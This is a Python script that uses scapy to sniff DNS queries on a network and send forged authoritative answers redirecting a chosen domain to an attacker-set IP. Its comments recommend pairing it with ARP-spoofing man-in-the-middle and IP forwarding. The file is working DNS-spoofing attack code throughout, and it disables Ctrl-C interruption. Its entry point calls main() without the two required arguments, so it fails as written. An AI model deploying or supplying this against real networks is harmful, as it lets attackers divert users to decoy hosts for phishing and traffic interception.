from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.all import send, sniff
import signal
import ipaddress

# Timing: DNS queries and responses are sensitive to timing.
# If the spoofed response arrives after the legitimate DNS response, it may be ignored.
# Running the script on a high-performance setup or using a preconfigured MITM setup
# (e.g., ARP spoofing) can help improve timing reliability.

# Employ the MitM to improve the timing reliability. Also as an extra add can be
# to have your machine be used as a Gateway by allowing IP forwarding

TARGET_DOMAIN=""  ## Global holder to set the target domain to redirect resolv from
FAKE_IP=""  ## Global holder to set the IP to redirect to, preferably a decoy host

def is_valid_ip(target):
  try:
    ipaddress.ip_address(target)
    return True
  except ValueError:
    return False

def process_packet(packet):
  # Check if the packet is a DNS query
  if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
    dns_query = packet[DNSQR].qname.decode()
    print(f"Intercepted DNS request for: {dns_query}")

    # Check if the query matches the target domain
    if TARGET_DOMAIN in dns_query:
      # Craft a spoofed DNS response
      spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                          DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                              an=DNSRR(rrname=dns_query, ttl=10, rdata=FAKE_IP))

      # Send the spoofed packet
      send(spoofed_packet, verbose=0)
      print(f"Sent spoofed response: {dns_query} -> {FAKE_IP}")

def main(in_target_domain, in_fake_ip):
  global TARGET_DOMAIN
  global FAKE_IP

  TARGET_DOMAIN = in_target_domain
  FAKE_IP = in_fake_ip
  # Sniff DNS requests and apply the process_packet function
  ## Oh boy ...
  signal.signal(signal.SIGINT, signal.SIG_IGN)
  print(f"Starting DNS poisoning on domain: {TARGET_DOMAIN}")
  sniff(filter="udp port 53", prn=process_packet)

if __name__ == "__main__":
    main()